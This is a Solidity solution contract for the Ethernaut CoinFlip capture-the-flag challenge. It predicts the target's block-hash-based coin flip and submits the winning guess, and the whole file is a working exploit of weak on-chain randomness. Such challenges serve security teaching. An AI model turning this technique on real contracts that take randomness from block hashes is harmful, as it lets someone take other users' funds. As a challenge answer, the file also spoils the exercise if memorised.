// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

/**
 * @title ICoinFlip
 * @dev Interface for the CoinFlip contract from the Ethernaut CTF challenge
 */
interface ICoinFlip {
    /**
     * @dev Makes a guess on the coin flip
     * @param _guess The boolean guess (true for heads, false for tails)
     * @return Whether the guess was correct
     */
    function flip(bool _guess) external returns (bool);
    
    /**
     * @dev Returns the number of consecutive correct guesses
     * @return The number of consecutive wins
     */
    function consecutiveWins() external view returns (uint256);
}

/**
 * @title GuessCoinFlip
 * @dev Solution contract for the CoinFlip Ethernaut challenge
 * @notice This contract exploits the predictable randomness in the CoinFlip contract
 * @custom:security-contact security@example.com
 */
contract GuessCoinFlip {
    /// @notice Reference to the target CoinFlip contract
    ICoinFlip public coinFlip;
    
    /// @notice Address of the target CoinFlip contract
    address public coinflipAddress;
    
    /// @notice The same factor used in the original CoinFlip contract
    /// @dev Used to calculate the coin flip result in the same way as the target contract
    uint256 FACTOR = 57896044618658097711785492504343953926634992332820282019728792003956564819968;

    /**
     * @dev Constructor sets the address of the CoinFlip contract to attack
     * @param _coinFlipAddress The address of the deployed CoinFlip contract
     */
    constructor(address _coinFlipAddress) {
        coinflipAddress = _coinFlipAddress;
        coinFlip = ICoinFlip(coinflipAddress);
    }

    /**
     * @dev Predicts the outcome of the next coin flip and makes the correct guess
     * @notice This function calculates the result of the next coin flip using the same algorithm
     * as the target contract, then submits that guess to guarantee a win
     */
    function getCoinFlip() public {
        // Use the same algorithm as the CoinFlip contract to predict the result
        uint256 blockValue = uint256(blockhash(block.number - 1));
        uint256 coinFlipFactor = blockValue / FACTOR;
        bool side = coinFlipFactor == 1 ? true : false;

        // Call the flip function with our predicted result
        coinFlip.flip(side);
    }
}